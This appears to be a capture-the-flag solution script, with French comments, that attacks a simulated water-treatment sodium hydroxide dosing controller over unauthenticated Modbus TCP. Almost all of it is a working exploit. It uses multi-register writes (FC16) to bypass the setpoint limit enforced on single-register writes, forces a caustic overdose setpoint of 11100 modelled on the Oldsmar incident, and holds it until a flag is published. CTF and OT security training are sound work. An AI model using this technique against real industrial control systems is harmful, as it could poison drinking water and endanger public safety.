#!/usr/bin/env python3
# OT#001 - Water treatment NaOH dosing controller (Modbus TCP, port 6000, pas d'auth).
#
# Modele du process (decouvert par sondage) - tout est en HOLDING REGISTERS :
#   [0] = consigne NaOH (setpoint). Validee a l'ecriture SIMPLE (FC06) : toute valeur > 200
#         est rejetee (relit 0). C'est la "securite" cote process.
#   [1] = concentration mesuree. Pilotee par le process, monte progressivement vers [0].
#   [2] = indicateur de danger (passe a 1 quand la consigne est dangereuse).
#   [3] = bit d'etat (=1 au repos).
#
# Faille : l'ecriture MULTIPLE (FC16, write_registers) sur [0]+[1] CONTOURNE la validation
#          de FC06 -> on peut imposer une consigne enorme (11100, la valeur Oldsmar).
# Objectif : surdosage soutenu. Quand la concentration [1] depasse ~9600 et s'y maintient,
#            le flag est publie en ASCII dans les holding registers 100..118.
#
# pymodbus 2.5.3 (API .client.sync). En 3.x : from pymodbus.client import ModbusTcpClient
import time, struct, re
from pymodbus.client.sync import ModbusTcpClient

HOST, PORT = "169.58.126.107", 6000
DANGER_SETPOINT = 11100          # > 200 : passe par FC16 pour contourner la validation FC06

def read_all(c, n=130):
    out = []
    a = 0
    while a < n:
        k = min(125, n - a)
        r = c.read_holding_registers(a, k, unit=1)
        if r.isError():
            break
        out += r.registers
        a += k
    return out

def find_flag(regs):
    raw = b"".join(struct.pack(">H", v) for v in regs)   # 1 registre = 2 octets ASCII
    txt = "".join(chr(x) if 32 <= x < 127 else "." for x in raw)
    m = re.search(r"CTF\{[^}]*\}", txt)
    return m.group() if m else None

def main():
    c = ModbusTcpClient(HOST, port=PORT, timeout=5)
    assert c.connect(), "connexion KO"

    # FC16 : impose la consigne dangereuse (contourne le plafond a 200 de FC06)
    c.write_registers(0, [DANGER_SETPOINT, 0], unit=1)
    print(f"[+] consigne dangereuse ecrite ([0]={DANGER_SETPOINT}) via FC16")

    # on maintient et on attend que la concentration monte, puis que le flag se publie
    t0 = time.time()
    while time.time() - t0 < 120:
        c.write_registers(0, [DANGER_SETPOINT, 0], unit=1)   # maintien
        time.sleep(2)
        regs = read_all(c)
        flag = find_flag(regs)
        print(f"    [0]={regs[0]} [1](concentration)={regs[1]} [2](danger)={regs[2]}", flush=True)
        if flag:
            print(f"\n[+] FLAG = {flag}")
            print("    (publie dans les holding registers 100..118)")
            break
    c.close()

if __name__ == "__main__":
    main()
